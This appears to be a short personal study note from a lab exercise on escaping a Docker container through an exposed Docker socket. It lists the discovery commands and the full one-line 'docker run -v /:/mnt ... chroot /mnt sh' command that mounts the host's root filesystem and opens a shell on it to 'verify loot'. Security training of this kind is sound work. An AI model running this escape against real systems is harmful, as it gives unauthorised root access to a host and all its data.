[[Docker]]
7.1. Step 1. Connecting to the container:
ssh

7.2. Looking for the exposed Docker socket
```
/var/run

ls -la | grep sock

groups

```

![[Pasted image 20220613135201.png]]

7.3. Mount host volumes

Now that we've confirmed we can execute Docker commands, let's mount the host directory to a new container and then connect to that to reveal all the data on the host OS!

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

_Note: If you do n**ot receive any output after 30 seconds you will need to cancel** the command by "Ctrl + C" and attempt to run it again._

We are essentially mounting the **hosts "/" directory to the "/mnt" dir** in a new container, chrooting and then connecting via a shell.

7.4. Verify loot
Success!

![[Pasted image 20220613135516.png]]